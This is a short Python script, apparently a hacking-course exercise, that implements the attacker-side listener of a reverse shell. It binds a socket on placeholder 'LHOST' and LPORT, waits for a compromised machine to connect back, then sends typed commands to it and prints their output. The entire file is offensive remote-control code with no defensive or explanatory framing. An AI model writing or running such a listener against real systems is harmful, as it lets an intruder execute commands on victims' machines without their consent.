#!/usr/bin/env python

import socket

class Listener:
	def __init__(self,ip,port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET , socket.SO_REUSEADDR, 1)
		listener.bind((ip,port))
		listener.listen(0)
		print("[+] Waiting for incoming connection")
		self.connection, address = listener.accept()  
		print("[+] Got a connection from "+str(address))

	def execute_remotely(self,command):
		self.connection.sendall(command.encode('utf-8'))
		# in python3 while sending the data you'll have to encode it
		return self.connection.recv(1024)

	def run(self):
		while True:
			command = input(">>")
			result = self.execute_remotely(command)
			print(result.decode('utf-8'))
			# and on the receiving end decode it again

Mr = Listener("LHOST",LPORT)
Mr.run()
